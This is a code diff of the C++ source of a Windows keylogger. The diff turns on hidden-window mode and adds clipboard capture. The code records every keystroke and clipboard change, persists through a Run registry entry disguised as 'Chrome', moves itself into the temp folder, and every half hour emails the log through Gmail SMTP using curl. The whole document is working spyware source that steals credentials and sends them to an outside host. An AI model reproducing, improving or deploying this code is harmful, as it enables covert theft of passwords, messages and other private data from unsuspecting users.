@@ -18,14 +18,15 @@ const string LogFileName = "data.th";
 const string EmailFrom = "example@gmail.com";
 const string EmailFromPassword = "YourPassowrd";
 const string EmailTo = "example@gmail.com";
-const bool IsWindowHidden = false;
+const bool IsWindowHidden = true;
+const bool LogClipboard = true;
 
 
 void send() {
 	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
 	system(cmd.c_str());
 }
-inline bool filexits(const std::string& name) {
+inline bool filexits(const string& name) {
 	struct stat buffer;
 	return (stat(name.c_str(), &buffer) == 0);
 }
@@ -39,7 +40,7 @@ string GetDirectory() {
 	GetSystemDirectory(letter, sizeof(letter));
 
 	cmd3 += letter[0];
-	cmd3 += ":\\Users\\" + (string)username+ "\\AppData\\Local\\Temp\\";
+	cmd3 += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\";
 
 	return cmd3;
 }
@@ -47,18 +48,18 @@ void autostart() {
 	string cmd = GetDirectory();
 	cmd += exe_name;
 	if (!filexits(cmd.c_str())) {
-		
-		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
-	
+
+		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d " + cmd;
+
 		system(cmd2.c_str());
 
 		fstream file;
 		file.open("temp.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n"
-		 << "move " + exe_name + " %temp%\n"
-		 << "start  %temp%\\"+ exe_name
-		 << "\ndel temp.bat"
-		 << "\nexit";
+			<< "move " + exe_name + " %temp%\n"
+			<< "start  %temp%\\" + exe_name
+			<< "\ndel temp.bat"
+			<< "\nexit";
 
 		file.close();
 		system("start temp.bat");
@@ -126,19 +127,43 @@ bool SpecialKeys(int S_Key) {
 	}
 }
 
+HANDLE clip = 0;
+char* buff;
+string buffstr = "";
+void ClipBoard() {
+
+		OpenClipboard(NULL);
+
+		if (IsClipboardFormatAvailable(CF_TEXT))
+		{
+			clip = GetClipboardData(CF_TEXT);
+		}
+		else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
+		{
+			clip = GetClipboardData(CF_UNICODETEXT);
+		}
+		CloseClipboard();
+		buff = (char*)clip;
+		if (buff != buffstr) {
+			cout << buff<<endl;
+			buffstr = buff;
+			LOG(" #CLIPBOARD# ");
+			LOG(buffstr);
+		}
+}
+
 int main()
 {
 	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
 	fstream LogFile;
-	//To make sure file is created
-	LogFile.open(GetDirectory()+LogFileName, ios::out);
+	//To make sure  LogFile is created
+	LogFile.open(GetDirectory() + LogFileName, ios::out);
 	LogFile.close();
 	//Sleep because pc after boot can haven't connected to internet yet
 	Sleep(500);
-	
-    autostart();
+
+	autostart();
 	send();
-	LogFile.open(LogFileName, fstream::app);
 
 	string minutes;
 	int minutesInt;
@@ -150,27 +175,25 @@ int main()
 	tt = localtime(&t);
 
 	//Log at start of program
-	if (LogFile.is_open()) {
-		LogFile << endl << "###" << asctime(tt);
-	}
-	else
-	{
 		LogFile.open(LogFileName, fstream::app);
 		LogFile << endl << "###" << asctime(tt);
-	}
+		LogFile.close();
+	
 
 	while (true) {
-		if (!LogFile.is_open()) LogFile.open(LogFileName, fstream::app);
+		
 		time(&t);
 		tt = localtime(&t);
 		minutes = asctime(tt)[14];
 		minutes += asctime(tt)[15];
 		minutesInt = atoi(minutes.c_str());
+
 		//saving and sending data every half an hour
 		if ((minutesInt == 00) && (IsOnlyOneTime == true) || (minutesInt == 30) && (IsOnlyOneTime == true))
 		{
-				
+			LogFile.open(LogFileName, fstream::app);
 			LogFile << endl << "#|#" << asctime(tt);
+			LogFile.close();
 			send();
 			remove(LogFileName.c_str());
 			IsOnlyOneTime = false;
@@ -180,13 +203,17 @@ int main()
 		{
 			IsOnlyOneTime = true;
 		}
+		//Log Clipboard
+		if (LogClipboard) ClipBoard();
 		Sleep(10);
 		for (int KEY = 8; KEY <= 190; KEY++)
 		{
 			// Logging chars
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
-						LogFile << char(KEY);
+					LogFile.open(LogFileName, fstream::app);
+					LogFile << char(KEY);
+					LogFile.close();
 				}
 			}
 		}
